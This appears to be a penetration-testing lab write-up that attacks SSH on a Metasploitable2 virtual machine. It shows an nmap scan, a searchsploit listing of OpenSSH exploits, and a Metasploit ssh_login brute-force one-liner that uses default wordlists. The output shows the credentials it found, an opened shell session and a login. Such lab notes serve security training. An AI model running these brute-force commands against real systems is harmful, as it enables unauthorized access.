### SSH (PORT 22) - CHECK

This port is used for SSH to a machine, in this case
it is metasploitable2 machine. Usually SSH port is open but
forwarded to another port. In the scenario that we're using
metasploitable2, since it's used as vulnerable os, it's opened
on default port 22.

**Nmap scan**
````
$ nmap -p 22 192.168.56.101
````

*Port 22 // scan results*
````
Nmap scan report for 192.168.56.101 (192.168.56.101)
Host is up (0.00038s latency).

PORT   STATE SERVICE
22/tcp open  ssh

````
**Searchsploit**
````
$ searchsploit openssh 4.7p1
````

````
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                       | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                 | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                   | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                         | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Un | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading       | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                           | linux/remote/45939.py
--------------------------------------------------------------- ---------------------------------
````

**Metasploitable**
````
$ msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login;set USER_FILE /usr/share/metasploit-framework/data/wordlists/http_default_users.txt;set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt;set RHOSTS 192.168.56.101;set RPORT 22;exploit'
````

**Output**
````
[+] 192.168.56.101:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),
20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin)
,119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008
i686 GNU/Linux '
[*] Command shell session 2 opened (10.0.2.15:43913 -> 192.168.56.101:22) at 2020-11-11 06:56:53 -0500
````

**SSH Login**
````
$ ssh msfadmin@192.168.56.101
msfadmin@192.168.56.101's password: msfadmin

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Wed Nov 11 07:02:56 2020
msfadmin@metasploitable:~$ 
````
